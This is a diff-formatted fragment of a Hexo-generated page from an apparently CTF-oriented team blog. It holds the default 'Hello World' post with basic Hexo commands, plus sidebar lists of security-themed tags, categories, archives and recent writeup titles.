+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/1969/12/31/hello-world/" class="article-date">
+  <time datetime="1969-12-31T16:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/1969/12/31/hello-world/">Hello World</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<p>Thanks to the plugin <code>hexo-multiauthor</code>, we can support more than one author now!</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/1969/12/31/hello-world/" data-id="clg6iymp9000qguot2x945kxi" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; __(&#39;prev&#39;)</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+</section>
+        
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/members" class="mobile-nav-link">Members</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+  </div>
+
+</body>
+
+</html>
